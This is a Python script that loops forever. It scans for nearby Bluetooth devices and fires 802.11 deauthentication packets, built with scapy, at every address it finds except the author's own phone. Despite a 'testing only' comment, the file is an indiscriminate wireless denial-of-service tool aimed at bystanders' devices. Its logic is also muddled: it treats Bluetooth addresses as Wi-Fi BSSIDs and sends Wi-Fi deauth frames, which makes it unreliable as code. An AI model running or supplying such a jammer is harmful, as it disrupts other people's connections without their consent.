import asyncio
from bleak import BleakScanner
import time
from scapy.all import *
import sys

# @Jukka J
# 01.02.2023
# For testing purposes only. I highly encourage not to use this script in public places without restricting modifications.
# Printing actions of this script are not very refined

devices_array = []
packet_cnt = 100 # Supposed to be to some higher number e.g 500-1000

# Timeframe
inter_ms = 0.1 # Change according packet count 

# If you want to keep using some device while running this script, add it here
# Multiple devices would just simply need new variables + "and"-operators

#                 just for example
#                       ||
#                       \/                      
your_device_name = "J's A04s";

def send_deauth(bssid):
    global packet_cnt
    global inter_ms
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid)/Dot11Deauth()
    sendp(packet, count=packet_cnt, inter=inter_ms)

async def run():
    while True:
        scanner = BleakScanner()
        # Scan for devices within bluetooth transmitting range
        devices = await scanner.discover()
        for device in devices:
            #======values by keys==========
            bssid = device.address
            client = device.name
            #==============================
            new_device = [bssid, client]
            
            if new_device not in devices_array:
                devices_array.append(new_device)
           
        for ind in devices_array:
            if ind[1] != "":
                sys.stdout.write("Deauth target's BSSID: " + ind[0] + " and name: " + ind[1] + "\r")
            else:
                sys.stdout.write("Deauth target's BSSID: " + ind[0] + " and name: " + "<hidden>" + "\r")         

            sys.stdout.write("             Starting sending process:\r")
            if ind[1] != your_device_name:
                send_deauth(ind[0])
            sys.stdout.write("\033[F")  # move cursor up one line
 

        time.sleep(1)

loop = asyncio.get_event_loop()
loop.run_until_complete(run())

